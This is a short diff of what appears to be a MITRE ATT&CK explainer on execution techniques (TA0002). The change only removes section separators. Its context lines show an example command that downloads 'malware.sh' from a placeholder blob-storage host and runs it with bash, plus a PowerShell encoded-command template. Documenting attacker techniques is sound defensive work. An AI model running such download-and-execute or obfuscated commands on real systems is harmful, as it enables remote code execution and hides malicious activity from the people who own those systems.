@@ -27,8 +27,6 @@ Attackers use PowerShell, Unix shells, and other scripting interpreters to run c
     curl -o malware.sh https://<storage>.blob.core.windows.net/malware.sh && bash malware.sh
     ```
 
-***
-
 ### **3. Automation and Scheduled Execution**
 
 **Technique: T1053 - Scheduled Task/Job**\
@@ -110,8 +108,6 @@ Attackers hide commands by encoding or obfuscating them.
     ```powershell
     powershell.exe -EncodedCommand <Base64EncodedPayload>
     ```
-
-***
 
 ### **Summary Techniques for TA0002**
 
